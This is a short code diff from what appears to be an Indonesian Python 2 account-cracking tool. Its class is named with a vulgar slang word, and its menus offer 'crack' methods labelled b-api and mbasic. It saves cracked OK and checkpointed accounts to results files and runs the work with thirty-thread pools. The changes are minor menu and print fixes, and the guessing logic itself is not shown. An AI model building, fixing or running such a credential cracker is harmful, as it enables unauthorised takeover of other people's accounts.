@@ -337,7 +337,7 @@ class ngentod:
                                         log.submit(self.basic, indo, zafi_)
                                     except: pass
                             os.remove(self.apk);exit()
-                        elif ind in ('2', '03'):
+                        elif ind in ('3', '03'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
@@ -348,7 +348,7 @@ class ngentod:
                                     except: pass
                             os.remove(self.apk);exit()
                         else:
-                            print '\n %s[!] isi yang benar kentod'%(M);self.zona()
+                            print ('\n %s[!] isi yang benar kentod'%(M));zona()
                     print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
                     print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
                     print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
@@ -417,7 +417,7 @@ class ngentod:
                         pass
             os.remove(self.apk);exit()
         else:
-            print("%s [!] Isi yang benar kentod "%(M));self.langsung()
+            print("\n%s [!] Isi yang benar kentod "%(M));self.langsung()
 
     def b_api(self, user, zona):
     	try:
